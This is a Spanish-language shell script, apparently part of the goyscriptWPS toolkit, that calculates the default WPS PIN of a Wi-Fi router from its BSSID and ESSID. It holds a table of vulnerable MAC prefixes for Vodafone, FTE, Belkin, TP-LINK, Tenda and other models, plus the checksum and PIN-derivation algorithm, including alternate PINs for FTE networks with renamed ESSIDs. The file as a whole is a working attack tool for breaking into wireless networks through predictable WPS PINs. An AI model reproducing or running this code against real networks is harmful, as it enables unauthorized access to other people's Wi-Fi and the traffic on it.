#!/bin/sh

# Prácticamente todo el código lo he sacado de los siguientes scripts:
#	- WPSPIN.sh creado por kcdtv
# 	- WPSPinGenerator creado por USUARIONUEVO
# Yo simplemente me he quedado con la parte del algoritmo y he modificado el script
# para que partiendo de un BSSID y ESSID dados como parámetros, nos devuelva un PIN.
# Todo ello para poder hacer uso del algoritmo desde goyscriptWPS sin necesidad
# de integrarlo directamente en el mismo, favoreciendo así las actualizaciones de ambos.
# Muchas gracias a los autores de los scripts mencionados por tan excelente trabajo.
# ¡¡¡Sois cojonudos!!! ;-D

# LISTA DE CAMBIOS
# versión 1.10
#	- versión inicial (partiendo de WPSPinGenerator)
# versión 1.10.1
# 	- añadida la MAC 6A:C0:6F
# versión 1.10.2
# 	- añadida la MAC 62:3C:E4
# versión 2.0
#	- retocado todo el código:
# 		- fusionado lo mejor de WPSPIN.sh y WPSPinGenerator
# 		- retocada la función de calcular_checksum (sobraban lineas de código)
# versión 2.0.1
# 	- añadida la MAC F8:3D:FF para FTE-???? (gracias a popeye7 por el aviso)
# 	- añadida la MAC 00:0B:3B para devolo-000B3B??????
#	- añadida la MAC 72:D1:5E para vodafone???? (gracias a kcdtv)
#	- añadida la MAC 72:7D:5E para vodafone???? (gracias a elpiji2001)
# versión 2.0.2
#	- añadidas varias MACs de la última versión de WPSPinGenerator
# versión 2.0.3
#	- corregido bug con redes FTE-???? (gracias a popeye7)
#	- añadida MAC 34:6B:D3 para FTE-???? (gracias a popeye7)


# CONSTANTES
SCRIPT="WPSPinGeneratorMOD"
VERSION=$(grep "# versión" $0 | tail -n 2 | head -n 1 | awk '{print $3}')

MACs_SOPORTADAS='
BSSID       ESSID
--------    ------------
04:C0:6F    FTE-????
20:2B:C1    FTE-????
28:5F:DB    FTE-????
34:6B:D3    FTE-????
80:B6:86    FTE-????
84:A8:E4    FTE-????
B4:74:9F    FTE-????
BC:76:70    FTE-????
CC:96:A0    FTE-????
F8:3D:FF    FTE-????
5C:4C:A9    vodafone????
62:B6:86    vodafone????
62:53:D4    vodafone????
62:A8:E4    vodafone????
62:C0:6F    vodafone????
62:C6:1F    vodafone????
6A:C7:14    vodafone????
6A:C6:1F    vodafone????
6A:53:D4    vodafone????
62:E8:7B    vodafone????
62:3D:FF    vodafone????
62:55:9C    vodafone????
62:6B:D3    vodafone????
6A:23:3D    vodafone????
6A:1D:67    vodafone????
62:7D:5E    vodafone????
6A:3D:FF    vodafone????
6A:55:9C    vodafone????
6A:6B:D3    vodafone????
6A:7D:5E    vodafone????
6A:A8:E4    vodafone????
6A:C0:6F    vodafone????
6A:D1:67    vodafone????
6A:D1:5E    vodafone????
72:A8:E4    vodafone????
72:C0:6F    vodafone????
72:C7:14    vodafone????
72:E8:7B    vodafone????
72:1D:67    vodafone????
72:3D:FF    vodafone????
72:53:D4    vodafone????
72:6B:D3    vodafone????
62:C7:14    vodafone????
62:23:3D    vodafone????
62:3C:E4    vodafone????
62:96:BF    vodafone????
72:55:9C    vodafone????
72:D1:5E    vodafone????
72:7D:5E    vodafone????
62:CD:BE    vodafone????
00:22:75    Belkin_N+_??????
08:86:3B    belkin.???
00:1C:DF    belkin.???
00:A0:26    WLAN_????
50:57:F0    WLAN_????
00:A0:B6    WLAN_??
C8:D1:5E    Jazztel_??
00:1D:1A    Inves
C8:3A:35    Tenda
00:B0:0C    Tenda
08:10:75    Tenda
E4:7C:F9    SEC_ LinkShare_??????
80:1F:02    SEC_ LinkShare_??????
00:22:F7    C300BRS4A
64:70:02    TP-LINK_??????
90:F6:52    TP-LINK_??????
B0:48:7A    TP-LINK_??????
F8:D1:11    TP-LINK_??????
00:0B:3B    devolo-000B3B??????
00:1F:1F    Default
00:26:CE    Default
00:15:77    ????
'

# COLORES
negro="\033[0;30m"
rojo="\033[0;31m"
verde="\033[0;32m"
marron="\033[0;33m"
azul="\033[0;34m"
magenta="\033[0;35m"
cyan="\033[01;36m"
grisC="\033[0;37m"
gris="\033[1;30m"
rojoC="\033[1;31m"
verdeC="\033[1;32m"
amarillo="\033[1;33m"
azulC="\033[1;34m"
magentaC="\033[1;35m"
cyanC="\033[1;36m"
blanco="\033[1;37m"
subrayar="\E[4m"
parpadeoON="\E[5m"
parpadeoOFF="\E[0m"
resaltar="\E[7m"

# CALCULA EL OCTAVO DÍGITO DEL PIN, EL CUAL NO ES MÁS QUE UN
# DÍGITO DE CONTROL QUE SE CALCULA A PARTIR DE LOS OTROS 7
calcular_checksum()
{
ACCUM=0
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`
DIGIT=`expr $ACCUM '%' 10`
CHECKSUM=`expr '(' 10 '-' $DIGIT ')' '%' 10`
PIN=`expr $PIN '+' $CHECKSUM`	# AÑADIMOS EL CHECKSUM AL PIN
PIN=`printf '%08d' $PIN`	# ASEGURAMOS QUE EL PIN TENGA 8 DIGITOS
}

calcular_pin()
{
BSSID_INICIO=$(echo $BSSID | cut -d ":" -f1,2,3)	# LOS TRES PRIMEROS PARES DE LA MAC (Ej: 00:11:22)
BSSID_FINAL=$(echo $BSSID | cut -d ':' -f4-)	# LOS TRES ÚLTIMOS PARES DE LA MAC (Ej: 33:44:55)
MAC=$(echo $BSSID_FINAL | tr -d ':')		# LOS TRES ÚLTIMOS PARES DE LA MAC sin los ':' (Ej: 334455)
MAC_DECIMAL=$(printf '%d' 0x$MAC)		# LA VARIABLE ANTERIOR CONVERTIDA DE HEXADECIMAL A DECIMAL
STRING=`expr '(' $MAC_DECIMAL '%' 10000000 ')'`	# NOS QUEDAMOS CON SÓLO 7 DÍGITOS (SI SOBRA UNO SE RECORTA POR LA IZQUIERDA)
PIN=`expr 10 '*' $STRING`			# AÑADIMOS UN CERO A LA DERECHA (8 DÍGITOS) PARA SUMAR LUEGO EL CHECKSUM
calcular_checksum				# SE CALCULA Y SE SUMA EL CHECKSUM AL DÍGITO DE LAS UNIDADES
PINWPS1=$PIN					# PINWPS1=PIN ESTÁNDAR PARA LA GRAN MAYORÍA DE LOS CASOS
STRING2=`expr $STRING '+' 8`			# SUMAMOS 8 PARA INICIAR EL ALGORITMO DEL PRIMER PIN POSIBLE PARA LAS REDES FTE-???? CON ESSID CAMBIADO
PIN=`expr 10 '*' $STRING2`			# IGUAL QUE ANTES. AÑADIMOS UN CERO PARA CALCULAR EL CHECKSUM
calcular_checksum
PINWPS2=$PIN					# PINWPS2=1º PIN POSIBLE PARA REDES FTE-???? CON ESSID CAMBIADO
STRING3=`expr $STRING '+' 14`			# SUMAMOS 14 PARA INICIAR EL ALGORITMO DEL SEGUNDO PIN POSIBLE PARA LAS REDES FTE-???? CON ESSID CAMBIADO
PIN=`expr 10 '*' $STRING3`			# AÑADIMOS UN CERO A LA DERECHA PARA CALCULAR EL CHECSUM
calcular_checksum
PINWPS3=$PIN					# PINWPS3=2º PIN POSIBLE PARA REDES FTE-???? CON ESSID CAMBIADO
if [[ $ESSID =~ ^FTE-[[:xdigit:]]{4}[[:blank:]]*$ ]] # COMPROBAMOS SI ES UNA RED FTE-???? Y ACTUAMOS EN CONSECUENCIA
then
	FINESSID=$(echo $ESSID | cut -d '-' -f2)			# FINESSID=LOS 4 CARACTERES SIGUIENTES A "FTE-"
	CUARTO_PAR=$(echo $BSSID_FINAL | cut -d ':' -f1 | tr -d ':')	# CUARTO_PAR=EL 4º PAR DE LA MAC
	MACESSID=$(echo $CUARTO_PAR$FINESSID)			# MACESSID=CONCATENACIÓN DE PAREMAC y FINESSID
	CONVERTEDMACESSID=$(printf '%d' 0x$MACESSID)		# CONVERTIMOS MACESSID DE HEXADECIMAL A DECIMAL
	RAIZ=`expr '(' $CONVERTEDMACESSID '%' 10000000 ')'`	# ASEGURAMOS QUEDARNOS CON SÓLO 7 DÍGITOS
	STRING4=`expr $RAIZ '+' 7`				# SUMAMOS 7
	PIN=`expr 10 '*' $STRING4`				# AÑADIMOS UN CERO A LA DERECHA PARA TENER 8 DÍGITOS Y PODER CALCULAR EL CHECKSUM CON LA FUNCIÓN AL EFECTO
	calcular_checksum
else
	case $BSSID_INICIO in
	04:C0:6F | 20:2B:C1 | 28:5F:DB | 80:B6:86 | 84:A8:E4 | B4:74:9F | BC:76:70 | CC:96:A0 | F8:3D:FF) # FTE-???? CON EL ESSID CAMBIADO (3 PINs POSIBLES)
		echo $PINWPS1
		echo $PINWPS2
		PIN=$PINWPS3;; # EL ÚLTIMO SE MOSTRARÁ CON EL "echo" QUE HAY DESPUÉS DEL "case" ;-D
	*)
		PIN=$PINWPS1;;
	esac
fi
echo $PIN
}

mostrar_ayuda()
{
echo -e "$blanco"
echo "$SCRIPT $VERSION by GOYfilms"
echo
echo -e $grisC"Modos de uso:"
echo -e $amarillo"   $0 <BSSID> <ESSID>"
echo -e $amarillo"   $0 --macs" $grisC:listado de las MACs soportadas
echo
echo -e $grisC"Ejemplos:"
echo -e $amarillo"   $0 00:11:22:33:44:55 vodafoneFFFF"
echo -e "$grisC"
exit
}

######################################################################
# PROGRAMA PRINCIPAL
######################################################################

#clear
if [ $# -lt 2 ]
then
	if [ "$1" = "--macs" ]
	then
		echo -e $amarillo"$MACs_SOPORTADAS"
	else
		mostrar_ayuda
	fi
else
	BSSID=$1
	ESSID=$2
	calcular_pin
fi
